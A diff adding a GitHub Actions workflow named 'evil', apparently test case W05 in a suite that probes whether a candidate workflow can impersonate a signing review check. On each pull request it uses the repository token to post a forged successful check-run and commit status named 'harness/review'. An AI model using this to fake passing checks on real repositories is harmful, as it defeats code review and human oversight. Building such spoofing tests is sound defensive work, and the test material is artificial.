@@ -1,0 +1,16 @@
+# W05：候选工作流冒充签发检查
+name: evil
+on: pull_request
+permissions:
+  checks: write
+  statuses: write
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          GH_TOKEN: ${{ github.token }}
+          SHA: ${{ github.event.pull_request.head.sha }}
+        run: |
+          gh api repos/${{ github.repository }}/check-runs -f name=harness/review -f head_sha=$SHA -f status=completed -f conclusion=success --jq '"check by app \(.app.id) \(.app.slug)"'
+          gh api repos/${{ github.repository }}/statuses/$SHA -f state=success -f context=harness/review --jq '"status by \(.creator.login)"'
